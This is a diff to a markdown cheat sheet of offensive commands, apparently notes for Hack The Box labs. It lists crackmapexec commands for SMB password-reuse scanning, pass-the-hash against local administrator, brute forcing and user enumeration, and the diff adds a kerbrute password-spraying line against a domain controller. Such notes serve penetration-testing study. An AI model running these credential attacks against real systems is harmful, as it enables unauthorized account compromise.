@@ -1363,7 +1363,7 @@ Verify listener hooked:
 |---|---|
 |Scan for password reuse (domain)|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD -d $DOMAIN`|
 |Scan for password reuse (local administrator, hash)|`crackmapexec smb $TARGET_RANGE -u administrator -H $NT_HASH --local-auth`|
-|Brute force password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD_LIST`|
+|Brute force password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD_LIST`<br>`kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -password $PASSWORD -domain $DOMAIN -dc-ip $DC_IP`|
 |List users|`crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --users`|
 
 Used in: [Infiltrator](/htb/infiltrator.md)
